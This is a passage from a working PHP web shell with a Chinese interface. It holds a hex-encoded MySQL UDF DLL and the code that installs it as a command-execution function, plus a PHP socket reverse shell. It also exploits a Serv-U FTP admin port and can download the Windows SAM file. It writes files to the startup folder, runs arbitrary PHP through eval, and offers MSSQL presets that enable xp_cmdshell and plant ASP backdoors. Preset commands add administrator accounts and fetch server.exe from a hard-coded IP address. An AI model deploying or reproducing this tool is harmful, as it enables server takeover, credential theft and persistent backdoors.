a0200cb9a0200d09a0200dc9a02004b696c6c50726f63657373004b696c6c50726f636573735f6465696e6974004b696c6c50726f636573735f696e69740050726f63657373566965770050726f63657373566965775f6465696e69740050726f63657373566965775f696e69740061626f75740061626f75745f6465696e69740061626f75745f696e6974006261636b7368656c6c006261636b7368656c6c5f6465696e6974006261636b7368656c6c5f696e697400636d647368656c6c00636d647368656c6c5f6465696e697400636d647368656c6c5f696e697400646f776e6c6f6164657200646f776e6c6f616465725f6465696e697400646f776e6c6f616465725f696e6974006f70656e33333839006f70656e333338395f6465696e6974006f70656e333338395f696e6974007265677265616400726567726561645f6465696e697400726567726561645f696e69740072656777726974650072656777726974655f6465696e69740072656777726974655f696e6974007368757400736875745f6465696e697400736875745f696e697400"; } function Mysql_m() { $MSG_BOX = '请先连接mysql,再导出DLL,最后执行命令.MYSQL用户必须为root权限,导出路径必须能加载DLL文件.'; $info = '命令回显'; $mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $sqlcmd = 'ver'; if(isset($_POST['mhost']) && isset($_POST['muser'])) { $mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport']; $conn = mysql_connect($mhost.':'.$mport,$muser,$mpass); if($conn) { $bl_str = mysql_get_server_info(); if(!empty($_POST['mlink']) && empty($_POST['mpath'])){ if($bl_str[2]>=1 && $bl_str[0]=5){ $bl_sql = "show variables like '%plugin_dir%'"; $bl_row = mysql_query($bl_sql,$conn); $bl_rows = mysql_fetch_row($bl_row); $mpath = $bl_rows[1]."/mysqlDLL.dll"; $MSG_BOX = '连接成功'; }else{ $mpath = 'C:/windows/mysqlDll.dll'; $MSG_BOX = '连接成功'; } } @mysql_select_db($mdata); if((!empty($_POST['outdll'])) && (!empty($_POST['mpath']))) { $mpath = File_Str($_POST['mpath']); mysql_query('DROP TABLE Spider_Temp_Tab',$conn); $query ='create table Spider_Temp_Tab (spider BLOB);'; if(!mysql_query($query,$conn)){ $MSG_BOX = '创建临时表pider_Temp_Tab表失败'.mysql_error(); }else{ $shellcode=Mysql_shellcode(); $query ="INSERT into Spider_Temp_Tab values (CONVERT($shellcode,CHAR));"; if(!mysql_query($query,$conn)){ $MSG_BOX = "插入自定义文件失败".mysql_error(); }else{ $mpath = File_Str($_POST['mpath']); $query ="SELECT spider FROM Spider_Temp_Tab INTO DUMPFILE '".$mpath."';"; if(!mysql_query($query,$conn)){ $MSG_BOX = "导出自定义dll出错".mysql_error(); }else{ $ap = explode('/', $mpath); $inpath = array_pop($ap); $query = 'create function cmdshell returns string soname \''.$inpath.'\';'; $MSG_BOX = @mysql_query($query,$conn) ? $MSG_BOX = '安装DLL成功' : $MSG_BOX = '安装DLL失败'.mysql_error(); mysql_query('DROP TABLE Spider_Temp_Tab',$conn); }}} } if(!empty($_POST['runcmd'])) { $sqlcmd = $_POST['sqlcmd']; $query = 'select cmdshell("'.$sqlcmd.'");'; $result = @mysql_query($query,$conn); if($result) { $k = 0; $info = NULL; while($row = @mysql_fetch_array($result)){$infotmp .= $row[$k];$k++;} $info = $infotmp; $MSG_BOX = '执行成功'; } else $MSG_BOX = '执行失败'; } } else $MSG_BOX = '连接MYSQL失败'; } print<<<END
<script language="javascript">
function Fullm(i){
	Str = new Array(11);
	Str[0] = "ver";
	Str[1] = "net user spider spider /add";
	Str[2] = "net localgroup administrators spider /add";
	Str[3] = "net start Terminal Services";
	Str[4] = "netstat -an";
	Str[5] = "ipconfig";
	Str[6] = "net user guest /active:yes";
	Str[7] = "copy c:\\\\1.php d:\\\\2.php";
	Str[8] = "tftp -i 219.134.46.245 get server.exe c:\\\\server.exe";
	Str[9] = "net start telnet";
	Str[10] = "shutdown -r -t 0";
	mform.sqlcmd.value = Str[i];
	return true;
}
</script>
<form method="POST" name="mform" id="mform" action="?s=m">
<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
<center><div class="actall">
地址 <input type="text" name="mhost" value="{$mhost}" style="width:110px">
端口 <input type="text" name="mport" value="{$mport}" style="width:110px">
用户 <input type="text" name="muser" value="{$muser}" style="width:110px">
密码 <input type="text" name="mpass" value="{$mpass}" style="width:110px">
库名 <input type="text" name="mdata" value="{$mdata}" style="width:110px">
	 <input type="submit" name="mlink" value="MYSQL连接" class="bt">
</div><div class="actall">
可加载路径 <input type="text" name="mpath" value="{$mpath}" style="width:555px"> 
<input type="submit" name="outdll" value="安装DLL" class="bt"></div>
<div class="actall">安装成功后可用 <br><input type="text" name="sqlcmd" value="{$sqlcmd}" style="width:515px;">
<select onchange="return Fullm(options[selectedIndex].value)">
<option value="0" selected>--命令集合--</option>
<option value="1">添加管理员</option>
<option value="2">设为管理组</option>
<option value="3">开启远程桌面</option>
<option value="4">查看端口</option>
<option value="5">查看IP</option>
<option value="6">激活guest帐户</option>
<option value="7">复制文件</option>
<option value="8">ftp下载</option>
<option value="9">开启telnet</option>
<option value="10">重启</option>
</select>
<input type="submit" name="runcmd" value="执行" class="bt">
<textarea style="width:720px;height:300px;">{$info}</textarea>
</div></center>
</form>
	<div class="actall" style="width:625px;float: left;">
	udf函数说明:<br />
	&nbsp&nbsp&nbsp&nbspcmdshell 执行cmd;<br />
	&nbsp&nbsp&nbsp&nbspdownloader 下载者,到网上下载指定文件并保存到指定目录;<br />
	&nbsp&nbsp&nbsp&nbspopen3389 通用开3389终端服务,可指定端口(不改端口无需重启);<br />
	&nbsp&nbsp&nbsp&nbspbackshell 反弹Shell;<br />
	&nbsp&nbsp&nbsp&nbspProcessView 枚举系统进程;<br />
	&nbsp&nbsp&nbsp&nbspKillProcess 终止指定进程;<br />
	&nbsp&nbsp&nbsp&nbspregread 读注册表;<br />
	&nbsp&nbsp&nbsp&nbspregwrite 写注册表;<br />
	&nbsp&nbsp&nbsp&nbspshut 关机,注销,重启;<br />
	&nbsp&nbsp&nbsp&nbspabout 说明与帮助函数;</div>
	<div class="actall" style="width:625;float: right;">
	常用命令:<br />
&nbsp&nbsp&nbsp&nbspcreate function cmdshell returns string soname 'moonudf.dll'<br />
&nbsp&nbsp&nbsp&nbspselect cmdshell('命令')<br />
&nbsp&nbsp&nbsp&nbspselect backshell('你的ip',12345)<br />
&nbsp&nbsp&nbsp&nbspnc -l -p 12345<div>
END;
return true; } function phpsocket() { @set_time_limit(0); $system=strtoupper(substr(PHP_OS, 0, 3)); if(!extension_loaded('sockets')) { if ($system == 'WIN') { @dl('php_sockets.dll') or die("Can't load socket"); }else{ @dl('sockets.so') or die("Can't load socket"); } } if(isset($_POST['host']) && isset($_POST['port'])) { $host = $_POST['host']; $port = $_POST['port']; }else{ print<<<eof
<html>
<br><br>
<body>
<div class="actall"><h5>反弹 cmdshell 用 php socket;<br>扩展项 php_sockets 应该被开启;<br>请检查 phpinfo();<br>code by <a href=http://www.Wolvez.org><font color=#FF67A0>Maple-X</font></a><br></h5><br></div>
<form method=post action="?s=r">
<div class="actall"><br>主机:<input type=text name=host value="">&nbsp&nbsp
端口:<input type=text name=port value="1120">&nbsp&nbsp<br><br>
<input type="radio" name=info value="linux" checked>Linux
<input type="radio" name=info value="win">Win &nbsp
<input class="bt" type=submit name=submit value="连接">
</form>
</body>
</html>
eof;
echo '<br><br>'; } if($system=="WIN") { $env=array('path' => 'c:\\windows\\system32'); }else{ $env = array('PATH' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin'); } $descriptorspec = array( 0 => array("pipe","r"), 1 => array("pipe","w"), 2 => array("pipe","w"), ); $host=gethostbyname($host); $proto=getprotobyname("tcp"); if(($sock=socket_create(AF_INET,SOCK_STREAM,$proto))<0) { die("Socket 创建失败"); } if(($ret=socket_connect($sock,$host,$port))<0) { die("链接失败"); }else{ $message="----------------------PHP Connect-Back--------------------\n"; socket_write($sock,$message,strlen($message)); $cwd=str_replace('\\','/',dirname(__FILE__)); while($cmd=socket_read($sock,65535,$proto)) { if(trim(strtolower($cmd))=="exit") { socket_write($sock,"Bye Bye\n"); exit; }else{ $process = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env); if (is_resource($process)) { fwrite($pipes[0], $cmd); fclose($pipes[0]); $msg=stream_get_contents($pipes[1]); socket_write($sock,$msg,strlen($msg)); fclose($pipes[1]); $msg=stream_get_contents($pipes[2]); socket_write($sock,$msg,strlen($msg)); $return_value = proc_close($process); } } } } } function su() { $SUPass = isset($_POST['SUPass']) ? $_POST['SUPass'] : '#l@$ak#.lk;0@P'; print<<<END
<div class="actall"><a href="?s=z">[执行命令]</a> <a href="?s=z&o=adduser">[增加用户]</a></div>
<form method="POST">
	<div class="actall">SU_端口 <input name="SUPort" type="text" value="43958" style="width:300px"></div>
	<div class="actall">SU_用户 <input name="SUUser" type="text" value="LocalAdministrator" style="width:300px"></div>
	<div class="actall">SU_密码 <input name="SUPass" type="text" value="{$SUPass}" style="width:300px"></div>
END;
if($_GET['o'] == 'adduser') { print<<<END
<div class="actall">用户<input name="user" type="text" value="spider" style="width:100px">
密码 <input name="password" type="text" value="spider" style="width:100px">
目录 <input name="part" type="text" value="C:\\\\" style="width:150px"></div>
END;
} else { print<<<END
<div class="actall">Cmd命令<input name="SUCommand" type="text" value="net user ln$ 123456 /add & net localgroup administrators ln$ /add" style="width:600px"><br>
<input name="user" type="hidden" value="ln$">
<input name="password" type="hidden" value="123456">
<input name="part" type="hidden" value="C:\\\\"></div>
END;
} echo '<div class="actall"><input class="bt" type="submit" value="执行" style="width:80px;"></div></form>'; 
if((!empty($_POST['SUPort'])) && (!empty($_POST['SUUser'])) && (!empty($_POST['SUPass']))) 
{ 
echo '<div class="actall">'; 
$sendbuf = ""; 
$recvbuf = ""; 
$domain = "-SETDOMAIN\r\n"."-Domain=haxorcitos|0.0.0.0|21|-1|1|0\r\n"."-TZOEnable=0\r\n"." TZOKey=\r\n"; 
$adduser = "-SETUSERSETUP\r\n"."-IP=0.0.0.0\r\n"."-PortNo=21\r\n"."-User=".$_POST['user']."\r\n"."-Password=".$_POST['password']."\r\n"."-HomeDir=c:\\\r\n"."-LoginMesFile=\r\n"."-Disable=0\r\n"."-RelPaths=1\r\n"."-NeedSecure=0\r\n"."-HideHidden=0\r\n"."-AlwaysAllowLogin=0\r\n"."-ChangePassword=0\r\n". "-QuotaEnable=0\r\n"."-MaxUsersLoginPerIP=-1\r\n"."-SpeedLimitUp=0\r\n"."-SpeedLimitDown=0\r\n"."-MaxNrUsers=-1\r\n"."-IdleTimeOut=600\r\n"."-SessionTimeOut=-1\r\n"."-Expire=0\r\n"."-RatioUp=1\r\n"."-RatioDown=1\r\n"."-RatiosCredit=0\r\n"."-QuotaCurrent=0\r\n"."-QuotaMaximum=0\r\n". "-Maintenance=None\r\n"."-PasswordType=Regular\r\n"."-Ratios=None\r\n"." Access=".$_POST['part']."\|RWAMELCDP\r\n"; 
$deldomain = "-DELETEDOMAIN\r\n"."-IP=0.0.0.0\r\n"." PortNo=21\r\n"; 
$sock = @fsockopen("127.0.0.1", $_POST["SUPort"], $errno, $errstr, 10); 
$recvbuf = @fgets($sock, 1024); 
echo "返回数据包: $recvbuf <br>"; 
$sendbuf = "USER ".$_POST["SUUser"]."\r\n"; 
@fputs($sock, $sendbuf, strlen($sendbuf)); 
echo "发送数据包: $sendbuf <br>"; 
$recvbuf = @fgets($sock, 1024); 
echo "返回数据包: $recvbuf <br>"; 
$sendbuf = "PASS ".$_POST["SUPass"]."\r\n"; 
@fputs($sock, $sendbuf, strlen($sendbuf)); 
echo "发送数据包: $sendbuf <br>"; 
$recvbuf = @fgets($sock, 1024); 
echo "返回数据包: $recvbuf <br>"; 
$sendbuf = "SITE MAINTENANCE\r\n"; 
@fputs($sock, $sendbuf, strlen($sendbuf)); 
echo "发送数据包: $sendbuf <br>"; 
$recvbuf = @fgets($sock, 1024); 
echo "返回数据包: $recvbuf <br>"; 
$sendbuf = $domain; 
@fputs($sock, $sendbuf, strlen($sendbuf)); 
echo "发送数据包: $sendbuf <br>"; 
$recvbuf = @fgets($sock, 1024); echo "返回数据包: $recvbuf <br>"; 
$sendbuf = $adduser; 
@fputs($sock, $sendbuf, strlen($sendbuf)); 
echo "发送数据包: $sendbuf <br>"; 
$recvbuf = @fgets($sock, 1024); 
echo "返回数据包: $recvbuf <br>"; 
if(!empty($_POST['SUCommand'])) 
{
 $exp = @fsockopen("127.0.0.1", "21", $errno, $errstr, 10); 
$recvbuf = @fgets($exp, 1024); 
echo "返回数据包: $recvbuf <br>"; 
$sendbuf = "USER ".$_POST['user']."\r\n"; @fputs($exp, $sendbuf, strlen($sendbuf)); 
echo "发送数据包: $sendbuf <br>"; 
$recvbuf = @fgets($exp, 1024); 
echo "返回数据包: $recvbuf <br>"; 
$sendbuf = "PASS ".$_POST['password']."\r\n"; 
@fputs($exp, $sendbuf, strlen($sendbuf)); 
echo "发送数据包: $sendbuf <br>"; 
$recvbuf = @fgets($exp, 1024); 
echo "返回数据包: $recvbuf <br>"; 
$sendbuf = "site exec ".$_POST["SUCommand"]."\r\n"; 
@fputs($exp, $sendbuf, strlen($sendbuf)); 
echo "发送数据包: site exec <font color=#006600>".$_POST["SUCommand"]."</font> <br>"; 
$recvbuf = @fgets($exp, 1024); 
echo "返回数据包: $recvbuf <br>"; 
$sendbuf = $deldomain; 
@fputs($sock, $sendbuf, strlen($sendbuf)); 
echo "发送数据包: $sendbuf <br>"; 
$recvbuf = @fgets($sock, 1024); 
echo "返回数据包: $recvbuf <br>"; 
@fclose($exp); 
} 
@fclose($sock); 
echo '</div>'; 
} 
} 
function Mysql_n() 
{ 
$MSG_BOX = ''; 
$mhost = 'localhost'; 
$muser = 'root'; 
$mport = '3306'; 
$mpass = ''; 
$mdata = 'mysql'; 
$msql = 'select version();'; 
if(isset($_POST['mhost']) && isset($_POST['muser'])) 
{ 
$mhost = $_POST['mhost']; 
$muser = $_POST['muser']; 
$mpass = $_POST['mpass']; 
$mdata = $_POST['mdata']; 
$mport = $_POST['mport']; 
if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) 
@mysql_select_db($mdata); 
else $MSG_BOX = '连接MYSQL失败'; 
} 
$downfile = 'c:/windows/repair/sam'; 
if(!empty($_POST['downfile'])) { $downfile = File_Str($_POST['downfile']); 
$binpath = bin2hex($downfile); 
$query = 'select load_file(0x'.$binpath.')'; 
if($result = @mysql_query($query,$conn)) { $k = 0; $downcode = ''; while($row = @mysql_fetch_array($result)){$downcode .= $row[$k];$k++;
} 
$filedown = basename($downfile); 
if(!$filedown) $filedown = 'spider.tmp'; 
$array = explode('.', $filedown); 
$arrayend = array_pop($array); 
header('Content-type: application/x-'.$arrayend); 
header('Content-Disposition: attachment; filename='.$filedown); 
header('Content-Length: '.strlen($downcode)); 
echo $downcode; exit; } else $MSG_BOX = '下载文件失败'; 
} 
$o = isset($_GET['o']) ? $_GET['o'] : ''; Root_CSS(); 
print<<<END
<form method="POST" name="nform" id="nform" action="?s=n&o={$o}" enctype="multipart/form-data">
<center><div class="actall"><a href="?s=n">[MYSQL执行语句]</a> 
<a href="?s=n&o=u">[MYSQL上传文件]</a> 
<a href="?s=n&o=d">[MYSQL下载文件]</a></div>
<div class="actall">
地址 <input type="text" name="mhost" value="{$mhost}" style="width:110px">
端口 <input type="text" name="mport" value="{$mport}" style="width:110px">
用户 <input type="text" name="muser" value="{$muser}" style="width:110px">
密码 <input type="text" name="mpass" value="{$mpass}" style="width:110px">
库名 <input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div>
<div class="actall" style="height:220px;">
END;
if($o == 'u') { $uppath = 'C:/Documents and Settings/All Users/「开始」菜单/程序/启动/exp.vbs'; if(!empty($_POST['uppath'])) { $uppath = $_POST['uppath']; $query = 'Create TABLE a (cmd text NOT NULL);'; if(@mysql_query($query,$conn)) { if($tmpcode = File_Read($_FILES['upfile']['tmp_name'])){$filecode = bin2hex(File_Read($tmpcode));} else{$tmp = File_Str(dirname(__FILE__)).'/upfile.tmp';if(File_Up($_FILES['upfile']['tmp_name'],$tmp)){$filecode = bin2hex(File_Read($tmp));@unlink($tmp);}} $query = 'Insert INTO a (cmd) VALUES(CONVERT(0x'.$filecode.',CHAR));'; if(@mysql_query($query,$conn)) { $query = 'SELECT cmd FROM a INTO DUMPFILE \''.$uppath.'\';'; $MSG_BOX = @mysql_query($query,$conn) ? '上传文件成功' : '上传文件失败'; } else $MSG_BOX = '插入临时表失败'; @mysql_query('Drop TABLE IF EXISTS a;',$conn); } else $MSG_BOX = '创建临时表失败'; } print<<<END
<br><br>上传路径 <input type="text" name="uppath" value="{$uppath}" style="width:500px">
<br><br>选择文件 <input type="file" name="upfile" style="width:500px;height:22px;">
</div><div class="actall"><input type="submit" value="上传" style="width:80px;">
END;
} elseif($o == 'd') { print<<<END
<br><br><br>下载文件 <input type="text" name="downfile" value="{$downfile}" style="width:500px">
</div><div class="actall"><input type="submit" value="下载" style="width:80px;">
END;
} else { if(!empty($_POST['msql'])) { $msql = $_POST['msql']; if($result = @mysql_query($msql,$conn)) { $MSG_BOX = '执行SQL语句成功<br>'; $k = 0; while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;} } else $MSG_BOX .= mysql_error(); } print<<<END
<script language="javascript">
function nFull(i){
	Str = new Array(15);
        Str[0] = "select command  Or input manual";
	Str[1] = "select version();";
        Str[2] = "select @@character_set_database;";
        Str[3] = "show databases;";
        Str[4] = "show tables;";
        Str[5] = "show columns from table_name;";
        Str[6] = "select @@hostname;";
        Str[7] = "select @@version_compile_os;";
        Str[8] = "select @@basedir;";
        Str[9] = "select @@datadir;";
        Str[10] = "describe table_name;";
        Str[11] = "select User,Password from mysql.user;";
	Str[12] = "select load_file(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C);";
	Str[13] = "select 'testtest' into outfile '/var/www/html/test.txt' from mysql.user;";
	Str[14] = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;";
	nform.msql.value = Str[i];
	return true;
}
</script>
<textarea name="msql" style="width:700px;height:200px;">{$msql}</textarea></div>
<div class="actall">
<select onchange="return nFull(options[selectedIndex].value)">
        <option value="0" selected>命令</option>
	<option value="1">显示版本</option>
        <option value="2">显示字符集</option>
        <option value="3">显示数据库</option>
        <option value="4">显示表名</option>
        <option value="5">显示字段</option>
        <option value="6">显示计算机名</option>
        <option value="7">系统版本</option>
        <option value="8">mysql路径</option>
        <option value="9">数据库路径</option>
        <option value="10">describe</option>
        <option value="11">显示root密码</option>
	<option value="12">导入文件</option>
	<option value="13">导出文件</option>
	<option value="14">开启外连</option>
</select>
<input class="bt" type="submit" value="执行">
END;
if(!empty($_POST['msql'])) { $msql = $_POST['msql']; if($result = @mysql_query($msql,$conn)) { $MSG_BOX = 'execute sql statement success<br>'; $row=mysql_fetch_row($result); echo '<table border="1" cellpadding="1" cellspacing="2">'."<tr>"; for ($i=0; $i<mysql_num_fields($result); $i++) { echo '<td><b>'.mysql_field_name($result, $i)."</b></td>"; } echo "</tr>"; mysql_data_seek($result, 0); while ($row=mysql_fetch_row($result)) { echo "<tr>"; for ($i=0; $i<mysql_num_fields($result); $i++ ) { echo '<td>'."$row[$i]".'</td>'; } echo "</tr>"; } echo "</table>"; mysql_free_result($result); } else $MSG_BOX .= mysql_error(); } } echo '<br>'.$MSG_BOX.'</div></center></form>'; return true; } function phpcode() { print<<<END
<html>
<br />
<div class="actall"><h5>用户自定义PHP代码:<h5><br></div>
<form action="?s=x" method="POST">
<div class="actall"><textarea name="phpcode" rows="20" cols="80">print_r(apache_get_modules());/*get apache modules which have openned*/</textarea></div><br />
<div><input class="bt" type="submit" value="执行"></div></form>
</html>
END;
$phpcode = $_POST['phpcode']; $phpcode = trim($phpcode); if($phpcode){ if (!preg_match('#<\?#si',$phpcode)){ $phpcode = "<?php\n\n{$phpcode}\n\n?>"; } eval("?".">$phpcode<?"); echo '<br><br>'; } return false; } function otherdb(){ $db = isset($_GET['db']) ? $_GET['db'] : ''; print<<<END
<form method="POST" name="dbform" id="dbform" action="?s=w&db={$db}" enctype="multipart/form-data">
<div class="actall"><a href="?s=w"> &nbsp psotgresql &nbsp</a> 
<a href="?s=w&db=ms"> &nbsp mssql &nbsp</a> 
<a href="?s=w&db=ora"> &nbsp oracle &nbsp</a>
<a href="?s=w&db=ifx"> &nbsp informix &nbsp</a>
<a href="?s=w&db=fb"> &nbsp  firebird &nbsp</a>
<a href="?s=w&db=db2">&nbsp db2 &nbsp</a></div></form>
END;
if ($db=="ms"){ $mshost = isset($_POST['mshost']) ? $_POST['mshost'] : 'localhost'; $msuser = isset($_POST['msuser']) ? $_POST['msuser'] : 'sa'; $mspass = isset($_POST['mspass']) ? $_POST['mspass'] : 'sa123'; $msdbname = isset($_POST['msdbname']) ? $_POST['msdbname'] : 'master'; $msaction = isset($_POST['action']) ? $_POST['action'] : ''; $msquery = isset($_POST['mssql']) ? $_POST['mssql'] : ''; $msquery = stripslashes($msquery); print<<<END
<form method="POST" name="msform" action="?s=w&db=ms">
<div class="actall">主机:<input type="text" name="mshost" value="{$mshost}" style="width:100px">
用户:<input type="text" name="msuser" value="{$msuser}" style="width:100px">
密码:<input type="text" name="mspass" value="{$mspass}" style="width:100px">
数据库名:<input type="text" name="msdbname" value="{$msdbname}" style="width:100px"><br><br>
<script language="javascript">
function msFull(i){
	Str = new Array(11);
        Str[0] = "";
	Str[1] = "select @@version;";
        Str[2] = "select name from sysdatabases;";
        Str[3] = "select name from sysobject where type='U';";
        Str[4] = "select name from syscolumns where id=Object_Id('table_name');";
        Str[5] = "Use master dbcc addextendedproc ('sp_OACreate','odsole70.dll');";
	Str[6] = "Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll');";
	Str[7] = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;";
        Str[8] = "exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;";
        Str[9] = "exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;";
        Str[10] = "Exec master.dbo.xp_cmdshell 'net user';";
        Str[11] = "Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(request(char(35)))%^> > c:\\\\1.asp';";
	Str[12] = "sp_makewebtask @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))%>''' ";
        msform.mssql.value = Str[i];
	return true;
}
</script>
<textarea name="mssql" style="width:600px;height:200px;">{$msquery}</textarea><br>
<select onchange="return msFull(options[selectedIndex].value)">
	<option value="0" selected>command</option>
        <option value="1">version</option>
        <option value="2">databases</option>
        <option value="3">tables</option>
        <option value="4">columns</option>
        <option value="5">add sp_oacreate</option>
	<option value="6">add xp_cmdshell</option>
	<option value="7">add xp_cmdshell(2005)</option>
        <option value="8">add sp_oacreate(2005)</option>
        <option value="9">open openrowset(2005)</option>
        <option value="10">xp_cmdshell exec</option>
        <option value="10">sp_oamethod exec</option>
        <option value="11">sp_makewebtask</option>
</select>
<input type="hidden" name="action" value="msquery">
<input class="bt" type="submit" value="执行"></div></form>
END;
if ($msaction == 'msquery'){ $msconn= mssql_connect ($mshost , $msuser, $mspass); mssql_select_db($msdbname,$msconn) or die("连接失败:" .mssql_get_last_message()); $msresult = mssql_query($msquery) or die(mssql_get_last_message()); echo '<font face="verdana">'; echo '<table border="1" cellpadding="1" cellspacing="2">'; echo "\n<tr>\n"; for ($i=0; $i<mssql_num_fields($msresult); $i++) { echo '<td bgcolor="#228B22"><b>'. mssql_field_name($msresult, $i); echo "</b></td>\n"; } echo "</tr>\n"; mssql_data_seek($result, 0); while ($msrow=mssql_fetch_row($msresult)) { echo "<tr>\n"; for ($i=0; $i<mssql_num_fields($msresult); $i++ ) { echo '<td bgcolor="#B8B8E8">'; echo "$msrow[$i]"; echo '</td>'; } echo "</tr>\n"; } echo "</table>\n"; echo "</font>"; mssql_free_result($msresult); mssql_close(); } } elseif ($db=="ora"){ $orahost = isset($_POST['orahost']) ? $_POST['orahost'] : 'localhost'; $oraport = isset($_POST['oraport']) ? $_POST['oraport'] : '1521'; $orauser = isset($_POST['orauser']) ? $_POST['orauser'] : 'root'; $orapass = isset($_POST['orapass']) ? $_POST['orapass'] : '123456'; $orasid = isset($_POST['orasid']) ? $_POST['orasid'] : 'ORCL'; $oraaction = isset($_POST['action']) ? $_POST['action'] : ''; $oraquery = isset($_POST['orasql']) ? $_POST['orasql'] : ''; $oraquery = stripslashes($oraquery); print<<<END
<form method="POST" name="oraform" action="?s=w&db=ora">
<div class="actall">主机:<input type="text" name="orahost" value="{$orahost}" style="width:100px">
端口:<input type="text" name="oraport" value="{$oraport}" style="width:50px">
用户:<input type="text" name="orauser" value="{$orauser}" style="width:80px">
密码:<input type="text" name="orapass" value="{$orapass}" style="width:100px">
SID:<input type="text" name="orasid" value="{$orasid}" style="width:50px"><br><br>
<script language="javascript">
function oraFull(i){
	Str = new Array(8);
        Str[0] = ""; 
	Str[1] = "select version();";
        Str[2] = "show databases;";
        Str[3] = "show tables from db_name;";
        Str[4] = "show columns from table_name;";
        Str[5] = "select user,password from mysql.user;";
	Str[6] = "select load_file(0xxxxxxxxxxxxxxxxxxxxx);";
	Str[7] = "select 0xxxxx from mysql.user into outfile 'c:\\\\inetpub\\\\wwwroot\\\\test.php'";
	oraform.orasql.value = Str[i];
	return true;
}
</script>
<textarea name="orasql" style="width:600px;height:200px;">{$oraquery}</textarea><br>
<select onchange="return oraFull(options[selectedIndex].value)">
	<option value="0" selected>command</option>
        <option value="1">version</option>
        <option value="2">databases</option>
        <option value="3">tables</option>
        <option value="4">columns</option>
        <option value="5">hashes</option>
	<option value="6">load_file</option>
	<option value="7">into outfile</option>
</select>
<input type="hidden" name="action" value="myquery">
<input class="bt" type="submit" value="执行"></div></form>
END;
if ($oraaction == 'oraquery'){ $oralink = OCILogon($orauser,$orapass,"(DEscriptION=(ADDRESS=(PROTOCOL =TCP)(HOST=$orahost)(PORT = $oraport))(CONNECT_DATA =(SID=$orasid)))") or die(ocierror()); $oraresult=ociparse($oralink,$oraquery) or die(ocierror()); $orarow=oci_fetch_row($oraresult); echo '<font face="verdana">'; echo '<table border="1" cellpadding="1" cellspacing="2">'; echo "\n<tr>\n"; for ($i=0; $i<oci_num_fields($oraresult); $i++) { echo '<td bgcolor="#228B22"><b>'. oci_field_name($oraresult, $i); echo "</b></td>\n"; } echo "</tr>\n"; ociresult($oraresult, 0); while ($orarow=ora_fetch_row($oraresult)) { echo "<tr>\n"; for ($i=0; $i<ora_num_fields($result); $i++ ) { echo '<td bgcolor="#B8B8E8">'; echo "$orarow[$i]"; echo '</td>'; } echo "</tr>\n"; } echo "</table>\n"; echo "</font>"; oci_free_statement($oraresult); ocilogoff(); } } elseif ($db == "ifx"){ $ifxuser = isset($_POST['ifxuser']) ? $_POST['ifxuser'] : 'root'; $ifxpass = isset($_POST['ifxpass']) ? $_POST['ifxpass'] : '123456'; $ifxdbname = isset($_POST['ifxdbname']) ? $_POST['ifxdbname'] : 'ifxdb'; $ifxaction = isset($_POST['action']) ? $_POST['action'] : ''; $ifxquery = isset($_POST['ifxsql']) ? $_POST['ifxsql'] : ''; $ifxquery = stripslashes($ifxquery); print<<<END
<form method="POST" name="ifxform" action="?s=w&db=ifx">
<div class="actall">数据库名:<input type="text" name="ifxhost" value="{$ifxdbname}" style="width:100px">
用户:<input type="text" name="ifxuser" value="{$ifxuser}" style="width:100px">
密码:<input type="text" name="ifxpass" value="{$ifxpass}" style="width:100px"><br><br>
<script language="javascript">
function ifxFull(i){
	Str = new Array(11);
        Str[0] = "";
	Str[1] = "select dbservername from sysobjects;";
        Str[2] = "select name from sysdatabases;";
        Str[3] = "select tabname from systables;";
        Str[4] = "select colname from syscolumns where tabid=n;";
        Str[5] = "select username,usertype,password from sysusers;";
	ifxform.ifxsql.value = Str[i];
	return true;
}
</script>
<textarea name="ifxsql" style="width:600px;height:200px;">{$ifxquery}</textarea><br>
<select onchange="return ifxFull(options[selectedIndex].value)">
	<option value="0" selected>command</option>
        <option value="1">dbservername</option>
        <option value="1">databases</option>
        <option value="2">tables</option>
        <option value="3">columns</option>
        <option value="4">hashes</option>
</select>
<input type="hidden" name="action" value="ifxquery">
<input class="bt" type="submit" value="执行"></div></form>
END;
if ($ifxaction == 'ifxquery'){ $ifxlink = ifx_connect($ifcdbname, $ifxuser, $ifxpass) or die(ifx_errormsg()); $ifxresult = ifx_query($ifxquery,$ifxlink) or die (ifx_errormsg()); $ifxrow=ifx_fetch_row($ifxresult); echo '<font face="verdana">'; echo '<table border="1" cellpadding="1" cellspacing="2">'; echo "\n<tr>\n"; for ($i=0; $i<ifx_num_fields($ifxresult); $i++) { echo '<td bgcolor="#228B22"><b>'. ifx_fieldproperties($ifxresult); echo "</b></td>\n"; } echo "</tr>\n"; mysql_data_seek($ifxresult, 0); while ($ifxrow=ifx_fetch_row($ifxresult)) { echo "<tr>\n"; for ($i=0; $i<ifx_num_fields($ifxresult); $i++ ) { echo '<td bgcolor="#B8B8E8">'; echo "$ifxrow[$i]"; echo '</td>'; } echo "</tr>\n"; } echo "</table>\n"; echo "</font>"; ifx_free_result($ifxresult); ifx_close(); } } elseif ($db=="db2"){ $db2host = isset($_POST['db2host']) ? $_POST['db2host'] : 'localhost'; $db2port = isset($_POST['db2port']) ? $_POST['db2port'] : '50000'; $db2user = isset($_POST['db2user']) ? $_POST['db2user'] : 'root'; $db2pass = isset($_POST['db2pass']) ? 